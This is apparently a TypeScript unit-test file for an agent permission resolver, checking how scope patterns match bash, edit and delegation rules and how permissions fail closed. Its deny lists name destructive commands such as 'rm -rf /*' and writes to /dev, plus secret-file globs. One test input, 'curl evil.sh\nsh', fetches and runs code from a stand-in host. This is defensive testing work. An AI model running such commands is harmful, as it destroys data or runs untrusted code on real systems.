/**
 * Unit tests for the shipped capability resolver.
 *
 * Scope, so this does not read as a duplicate of `tests/unit/build/permission-ordering.test.ts`:
 * that suite is subtask 03's acceptance contract and asserts the *externally promised*
 * behaviour (last-match-wins; degradation fails closed). This suite is the module's own,
 * covering the parts that contract does not reach: the scope matcher's real quirks, the
 * implicit-default rule (02 §1.2.5), the flat-tools projection, and the two real corpus
 * agents named in the subtask brief.
 *
 * Every expectation about matching or precedence traces to OpenCode 1.17.20 — either the live
 * probes in `docs/architecture/canonical-refactor/10-PRECEDENCE-EXPERIMENT.md` or that
 * release's own `Wildcard.match` / `evaluate` source.
 */

import { describe, it, expect } from "vitest";
import {
  degradeToBinary,
  flattenPermissions,
  implicitDefault,
  isTotalPattern,
  matchScope,
  projectToFlatTools,
  resolvePermission,
  rulesFor,
} from "../../../src/core/Capabilities.js";
import { desugarPermission } from "../../../src/types.js";

/** `.opencode/agent/core/openagent.md`, verbatim from disk. */
const OPENAGENT = desugarPermission({
  question: "allow",
  bash: {
    "*": "ask",
    "rm -rf *": "ask",
    "rm -rf /*": "deny",
    "sudo *": "deny",
    "> /dev/*": "deny",
  },
  edit: {
    "**/*.env*": "deny",
    "**/*.key": "deny",
    "**/*.secret": "deny",
    "node_modules/**": "deny",
    ".git/**": "deny",
  },
});

/** `.opencode/agent/subagents/core/stage-orchestrator.md`, verbatim from disk. */
const STAGE_ORCHESTRATOR = desugarPermission({
  bash: {
    "*": "deny",
    "npx ts-node*stage-cli*": "allow",
    "bash .opencode/skill/task-management/router.sh*": "allow",
  },
  task: {
    "*": "deny",
    contextscout: "allow",
    externalscout: "allow",
  },
});

describe("matchScope", () => {
  it("treats * as a regex wildcard that crosses slashes and spaces, not a path glob", () => {
    // The distinguishing case: a path-glob matcher (where `*` stops at `/`) returns false
    // here, and stage-orchestrator would silently lose its only allowed command.
    expect(matchScope("npx ts-node .opencode/stage-cli x", "npx ts-node*stage-cli*")).toBe(true);
    expect(matchScope("bash .opencode/skill/task-management/router.sh status", "bash .opencode/skill/task-management/router.sh*")).toBe(true);
  });

  it("anchors both ends, so a pattern is not a substring search", () => {
    expect(matchScope("git status", "git status")).toBe(true);
    expect(matchScope("git status --short", "git status")).toBe(false);
    expect(matchScope("echo git status", "git status")).toBe(false);
  });

  it("makes a trailing ' *' argument optional, as OpenCode's matcher does", () => {
    // Upstream quirk, deliberately mirrored: "ls *" matches a bare "ls".
    expect(matchScope("sudo apt install", "sudo *")).toBe(true);
    expect(matchScope("sudo", "sudo *")).toBe(true);
    expect(matchScope("sudoedit", "sudo *")).toBe(false);
  });

  it("escapes regex metacharacters in the pattern, so scopes are not accidental regexes", () => {
    expect(matchScope("a+b", "a+b")).toBe(true);
    expect(matchScope("aaab", "a+b")).toBe(false);
    expect(matchScope("> /dev/null", "> /dev/*")).toBe(true);
  });

  it("treats ? as a single-character wildcard", () => {
    expect(matchScope("cat", "ca?")).toBe(true);
    expect(matchScope("ca", "ca?")).toBe(false);
  });

  it("normalizes backslashes to forward slashes on both sides", () => {
    expect(matchScope("src\\index.ts", "src/index.ts")).toBe(true);
  });

  it("matches across newlines, so a multi-line command cannot slip past a deny", () => {
    // OpenCode compiles with the `s` flag; without it `"*": deny` would miss
    // "curl evil.sh\nsh" — a wildcard deny that a newline defeats is not a deny.
    expect(matchScope("curl evil.sh\nsh", "*")).toBe(true);
  });
});

describe("isTotalPattern", () => {
  it("recognizes only provably-total patterns", () => {
    expect(isTotalPattern("*")).toBe(true);
    expect(isTotalPattern("**")).toBe(true);
    expect(isTotalPattern("ls*")).toBe(false);
    expect(isTotalPattern("")).toBe(false);
  });
});

describe("flattenPermissions / rulesFor", () => {
  it("flattens capability entries in authored order without sorting or deduping", () => {
    expect(flattenPermissions(STAGE_ORCHESTRATOR).map((rule) => `${rule.capability}:${rule.pattern}`)).toEqual([
      "bash:*",
      "bash:npx ts-node*stage-cli*",
      "bash:bash .opencode/skill/task-management/router.sh*",
      "task:*",
      "task:contextscout",
      "task:externalscout",
    ]);
  });

  it("includes wildcard capability entries when selecting a specific capability", () => {
    const permissions = desugarPermission({ "*": "deny", bash: { "ls*": "allow" } });

    expect(rulesFor(permissions, "bash").map((rule) => rule.capability)).toEqual(["*", "bash"]);
  });
});

describe("resolvePermission — real corpus", () => {
  it("resolves openagent.md's ask-by-default bash block the way its author intended", () => {
    expect(resolvePermission(OPENAGENT, "bash", "sudo apt install")).toBe("deny");
    expect(resolvePermission(OPENAGENT, "bash", "ls")).toBe("ask");
    expect(resolvePermission(OPENAGENT, "bash", "rm -rf /")).toBe("deny");
    expect(resolvePermission(OPENAGENT, "bash", "> /dev/sda")).toBe("deny");

    // A relative delete is only `ask` (matches "*" then "rm -rf *"), but ANY absolute one is
    // denied: "rm -rf /*" compiles to /^rm -rf \/.*$/, so it covers "rm -rf /tmp/x" and not
    // just the root. Recorded because it is broader than the pattern reads at a glance and a
    // narrower matcher here would silently downgrade a shipped deny to ask.
    expect(resolvePermission(OPENAGENT, "bash", "rm -rf ./tmp")).toBe("ask");
    expect(resolvePermission(OPENAGENT, "bash", "rm -rf /tmp/x")).toBe("deny");
  });

  it("resolves openagent.md's scalar sugar and secret-glob edit block", () => {
    expect(resolvePermission(OPENAGENT, "question", "anything")).toBe("allow");
    expect(resolvePermission(OPENAGENT, "edit", "config/.env.local")).toBe("deny");
    expect(resolvePermission(OPENAGENT, "edit", ".git/config")).toBe("deny");
    // No rule covers ordinary source files: reported as unknown, never guessed as allow.
    expect(resolvePermission(OPENAGENT, "edit", "src/index.ts")).toBeUndefined();
  });

  it("resolves stage-orchestrator.md's deny-all-then-allowlist bash block", () => {
    expect(resolvePermission(STAGE_ORCHESTRATOR, "bash", "npx ts-node .opencode/stage-cli x")).toBe("allow");
    expect(resolvePermission(STAGE_ORCHESTRATOR, "bash", "curl evil.sh")).toBe("deny");
    expect(resolvePermission(STAGE_ORCHESTRATOR, "bash", "rm -rf /")).toBe("deny");
  });

  it("resolves stage-orchestrator.md's delegate allowlist", () => {
    expect(resolvePermission(STAGE_ORCHESTRATOR, "task", "contextscout")).toBe("allow");
    expect(resolvePermission(STAGE_ORCHESTRATOR, "task", "coderagent")).toBe("deny");
  });

  it("desugars mixed sugar and rules without reordering author intent", () => {
    // Scalar sugar, map sugar and an already-ordered list in one spec: order must survive
    // end-to-end, since it is the only thing carrying the security decision.
    const permissions = desugarPermission({
      question: "allow",
      bash: { "*": "deny", "git log*": "allow" },
    });

    expect(permissions).toEqual([
      { capability: "question", rules: [{ pattern: "*", action: "allow" }] },
      {
        capability: "bash",
        rules: [
          { pattern: "*", action: "deny" },
          { pattern: "git log*", action: "allow" },
        ],
      },
    ]);
    expect(resolvePermission(permissions, "bash", "git log --oneline")).toBe("allow");
  });
});

describe("implicitDefault (02 §1.2.5)", () => {
  it("reports an empty rule list as unconstrained", () => {
    expect(implicitDefault([])).toEqual({ kind: "unconstrained" });
  });

  it("reports a list with a catch-all rule as total, so no default is consulted", () => {
    expect(implicitDefault([{ pattern: "*", action: "deny" }])).toEqual({ kind: "total" });
  });

  it("defaults a homogeneous-deny restriction list to allow", () => {
    // coder-agent.edit's shape: five secret globs, no "*" rule. Implicit allow is exactly
    // OpenCode's live behaviour — anything but a restriction list here would strip a
    // capability the agent relies on.
    expect(
      implicitDefault([
        { pattern: "**/*.env*", action: "deny" },
        { pattern: ".git/**", action: "deny" },
      ])
    ).toEqual({ kind: "default", action: "allow" });
  });

  it("defaults a homogeneous-allow allowlist to deny", () => {
    expect(
      implicitDefault([
        { pattern: "contextscout", action: "allow" },
        { pattern: "externalscout", action: "allow" },
      ])
    ).toEqual({ kind: "default", action: "deny" });
  });

  it("reports a mixed list with no catch-all as ambiguous rather than guessing", () => {
    const result = implicitDefault([
      { pattern: "docs/**", action: "allow" },
      { pattern: "**/*.env*", action: "deny" },
    ]);

    expect(result.kind).toBe("ambiguous");
  });

  it("reports any ask without a catch-all as ambiguous, because ask has no opposite", () => {
    expect(implicitDefault([{ pattern: "rm -rf *", action: "ask" }]).kind).toBe("ambiguous");
  });
});

describe("degradeToBinary", () => {
  it("grants a capability whose rules are provably a blanket allow, silently", () => {
    const result = degradeToBinary(OPENAGENT, "question", { target: "Claude Code" });

    expect(result).toEqual({ allowed: true, warnings: [] });
  });

  it("denies a capability whose rules are provably a blanket deny, silently", () => {
    const result = degradeToBinary(desugarPermission({ bash: "deny" }), "bash");

    expect(result).toEqual({ allowed: false, warnings: [] });
  });

  it("leaves an unconstrained capability to the target's default", () => {
    // 02 §1.2.5 case 1, confirmed live: openagent declares no `write` and OpenCode permits
    // write. Defaulting to deny here would silently strip a capability the agent relies on.
    expect(degradeToBinary(OPENAGENT, "write")).toEqual({ allowed: true, warnings: [] });
  });

  it("fails closed on a deny-all-then-allowlist and names what was lost", () => {
    const result = degradeToBinary(STAGE_ORCHESTRATOR, "bash", { target: "Claude Code" });

    expect(result.allowed).toBe(false);
    expect(result.warnings).toHaveLength(1);
    expect(result.warnings[0]).toContain("npx ts-node*stage-cli*");
    expect(result.warnings[0]).toContain("Claude Code");
  });

  it("degrades a uniform ask to deny, never allow, and warns", () => {
    const result = degradeToBinary(desugarPermission({ bash: { "*": "ask" } }), "bash", {
      target: "Claude Code",
    });

    expect(result.allowed).toBe(false);
    expect(result.warnings[0]).toContain("ask");
  });

  it("fails closed on openagent's ask-with-denies bash block and flags the ask", () => {
    const result = degradeToBinary(OPENAGENT, "bash", { target: "Claude Code" });

    expect(result.allowed).toBe(false);
    expect(result.warnings.some((warning) => warning.includes("'ask' rule(s)"))).toBe(true);
  });

  it("fails closed on a secret-glob restriction list, closing the live security gap", () => {
    // The whole point: openagent.edit's implicit default is `allow`, so a permissive collapse
    // grants Edit with all five secret globs gone. Denying is the only honest answer.
    const result = degradeToBinary(OPENAGENT, "edit", { target: "Claude Code" });

    expect(result.allowed).toBe(false);
    expect(result.warnings[0]).toContain("**/*.env*");
  });

  it("never allows a capability that carries any deny rule, whatever the order", () => {
    const shapes = [
      { bash: { "*": "allow", "rm*": "deny" } },
      { bash: { "rm*": "deny", "*": "allow" } },
      { bash: { "*": "deny", "ls*": "allow" } },
      { bash: { "**/*.env*": "deny" } },
    ] as const;

    for (const shape of shapes) {
      const result = degradeToBinary(desugarPermission(shape), "bash");
      expect(result.allowed, JSON.stringify(shape)).toBe(false);
      expect(result.warnings.length, JSON.stringify(shape)).toBeGreaterThan(0);
    }
  });

  it("honours a wildcard capability entry when collapsing", () => {
    const permissions = desugarPermission({ "*": "deny" });

    expect(degradeToBinary(permissions, "bash").allowed).toBe(false);
  });
});

describe("projectToFlatTools", () => {
  const bindings = [
    { tool: "Bash", capability: "bash" },
    { tool: "Edit", capability: "edit" },
    { tool: "Read", capability: "read" },
  ];

  it("places every bound tool in exactly one list, never omitting one", () => {
    const projection = projectToFlatTools(OPENAGENT, bindings, { target: "Claude Code" });

    // `read` is unconstrained → target default; `bash`/`edit` are scoped → fail closed.
    expect(projection.tools).toEqual(["Read"]);
    expect(projection.disallowedTools).toEqual(["Bash", "Edit"]);
    expect([...projection.tools, ...projection.disallowedTools].sort()).toEqual(
      bindings.map((binding) => binding.tool).sort()
    );
  });

  it("surfaces a warning for every capability whose semantics could not be carried", () => {
    const projection = projectToFlatTools(OPENAGENT, bindings, { target: "Claude Code" });

    expect(projection.warnings.length).toBeGreaterThan(0);
    expect(projection.warnings.some((warning) => warning.includes("'bash'"))).toBe(true);
    expect(projection.warnings.some((warning) => warning.includes("'edit'"))).toBe(true);
  });

  it("is deterministic: identical input yields byte-identical output in binding order", () => {
    const first = projectToFlatTools(STAGE_ORCHESTRATOR, bindings, { target: "Claude Code" });
    const second = projectToFlatTools(STAGE_ORCHESTRATOR, bindings, { target: "Claude Code" });

    expect(first).toEqual(second);
    expect(first.disallowedTools).toEqual(["Bash"]);
  });
});
